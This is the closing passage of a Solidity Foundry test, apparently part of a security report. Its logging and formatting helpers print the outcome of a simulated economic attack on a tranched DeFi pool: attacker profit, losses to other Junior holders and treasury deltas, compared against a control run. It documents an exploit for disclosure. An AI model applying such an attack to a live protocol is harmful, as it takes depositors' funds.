                "  conservation: others' loss - (attacker net + treasury delta) = ", vm.toString(residual), " atoms"
            )
        );
        if (a.charge == 0) {
            return;
        }
        console2.log(
            string.concat(
                "  leg notional ",
                _usd(int256(a.legNotional)),
                " | charge C ",
                _usd(int256(a.charge)),
                " | pool cash in at open ",
                _usd(int256(a.poolInAtOpen)),
                " | theta ",
                _wad4(a.thetaWad),
                " | theta*C ",
                _usd(int256(a.thetaWad * a.charge / 1e18))
            )
        );
        console2.log(
            string.concat(
                "  depth open / close ",
                _usd(int256(a.depthOpen)),
                " / ",
                _usd(int256(a.depthClose)),
                " | fresh close rebate ",
                _usd(int256(a.freshCloseRebate)),
                " | close VPI (receipt) ",
                _usd(a.closeVpi)
            )
        );
        console2.log(
            string.concat(
                "  attacker LP P&L ",
                _usd(a.lpPnl),
                " | trade P&L ",
                _usd(a.tradePnl),
                " | of which execution fees ",
                _usd(int256(a.fees))
            )
        );
    }

    function _printControl(
        uint256 others0,
        Run memory ctl
    ) internal pure {
        Cyc memory c = ctl.cyc[0];
        _printHeader("(2) control: identical schedule, no attacker");
        console2.log(
            string.concat(
                "  other Junior holders value at start / checkpoint: ",
                _usd(int256(others0)),
                " / ",
                _usd(int256(c.others))
            )
        );
        console2.log(
            string.concat(
                "  Senior value @ checkpoint: ", _usd(int256(c.senior)), " | treasury ", _usd(int256(c.treasury))
            )
        );
        console2.log(
            string.concat(
                "  independent 100k LP realized: ",
                _usd(int256(ctl.indepRealized)),
                " at ",
                vm.toString(ctl.indepExitTime),
                " | timestamps ",
                vm.toString(c.tActivation),
                " ",
                vm.toString(c.tRedeemRequest),
                " ",
                vm.toString(c.tExit),
                " ",
                vm.toString(c.tCheckpoint)
            )
        );
    }

    function _printConstantDepth(
        Cyc memory a,
        Cyc memory c,
        Cyc memory binding
    ) internal pure {
        int256 newLpDelta = int256(a.newLpValue) - int256(c.newLpValue);
        int256 othersDelta = int256(a.others) - int256(c.others);
        _row("unrelated 3M depositor value @ checkpoint", int256(c.newLpValue), int256(a.newLpValue));
        console2.log(string.concat("  pre-existing Junior holders vs control: ", _usd(othersDelta - newLpDelta)));
        console2.log(
            string.concat(
                "  lifetime VPI of the leg ",
                _usd(a.closeVpi + int256(a.charge)),
                " | theta*C - fees ",
                _usd(int256(a.thetaWad * a.charge / 1e18) - int256(a.fees)),
                " | attacker net, clamp binding (test 1) ",
                _usd(binding.attackerNet),
                " (close VPI ",
                _usd(binding.closeVpi),
                ", fresh ",
                _usd(-int256(binding.freshCloseRebate)),
                ")"
            )
        );
    }

    function _printThreeCycles(
        Run memory ctl,
        Run memory atk
    ) internal pure {
        _printHeader("(4) three back-to-back late V-chg cycles (3 h cadence)");
        console2.log(
            "| cycle | E (unix)   | leg notional    | charge C      | theta  | attacker cycle | attacker cum.  | others vs ctl   | treasury vs ctl | resid |"
        );
        int256 prev;
        for (uint256 k; k < 3; ++k) {
            Cyc memory a = atk.cyc[k];
            Cyc memory c = ctl.cyc[k];
            int256 othersDelta = int256(a.others) - int256(c.others);
            int256 treasuryDelta = int256(a.treasury) - int256(c.treasury);
            console2.log(
                string.concat(
                    string.concat("| ", vm.toString(k + 1), "     | ", vm.toString(a.e), " | "),
                    _pad(_usd(int256(a.legNotional)), 15),
                    " | ",
                    _pad(_usd(int256(a.charge)), 13),
                    " | ",
                    _pad(_wad4(a.thetaWad), 6),
                    " | ",
                    _pad(_usd(a.attackerNet - prev), 14),
                    " | ",
                    _pad(_usd(a.attackerNet), 14),
                    " | ",
                    _pad(_usd(othersDelta), 15),
                    " | ",
                    _pad(_usd(treasuryDelta), 15),
                    " | ",
                    _pad(vm.toString(-othersDelta - a.attackerNet - treasuryDelta), 5),
                    " |"
                )
            );
            prev = a.attackerNet;
        }
        _printComparison("(4) totals after three cycles", ctl, atk, 2);
    }

    function _row(
        string memory label,
        int256 ctl,
        int256 atk
    ) internal pure {
        console2.log(
            string.concat(
                "| ",
                _padRight(label, 44),
                " | ",
                _pad(_usd(ctl), 16),
                " | ",
                _pad(_usd(atk), 16),
                " | ",
                _pad(_usd(atk - ctl), 16),
                " |"
            )
        );
    }

    /// @dev 6-decimal USDG atoms as a signed decimal string.
    function _usd(
        int256 v
    ) internal pure returns (string memory) {
        uint256 x = v < 0 ? uint256(-v) : uint256(v);
        bytes memory f = bytes(vm.toString(1e6 + x % 1e6));
        bytes memory frac = new bytes(6);
        for (uint256 i; i < 6; ++i) {
            frac[i] = f[i + 1];
        }
        return string.concat(v < 0 ? "-" : "", vm.toString(x / 1e6), ".", string(frac));
    }

    function _wad4(
        uint256 w
    ) internal pure returns (string memory) {
        string memory frac = vm.toString((w % 1e18) / 1e14);
        while (bytes(frac).length < 4) {
            frac = string.concat("0", frac);
        }
        return string.concat(vm.toString(w / 1e18), ".", frac);
    }

    function _pad(
        string memory s,
        uint256 width
    ) internal pure returns (string memory) {
        while (bytes(s).length < width) {
            s = string.concat(" ", s);
        }
        return s;
    }

    function _padRight(
        string memory s,
        uint256 width
    ) internal pure returns (string memory) {
        while (bytes(s).length < width) {
            s = string.concat(s, " ");
        }
        return s;
    }

}
```

</details>
